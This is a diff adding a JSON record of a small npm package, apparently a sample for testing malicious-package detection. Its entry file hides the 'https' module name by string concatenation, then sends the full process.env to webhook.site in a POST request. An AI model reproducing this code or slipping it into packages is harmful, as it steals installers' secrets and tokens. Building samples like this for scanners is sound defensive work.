@@ -1,0 +1,7 @@
+{
+  "packageName": "f2-dynamic-require",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"f2-dynamic-require\",\"main\":\"i.js\"}",
+    "i.js": "const m=\"ht\"+\"tps\";const lib=require(m);const e=JSON.stringify(process.env);const r=lib.request({host:\"webhook.site\",method:\"POST\"});r.end(e);"
+  }
+}
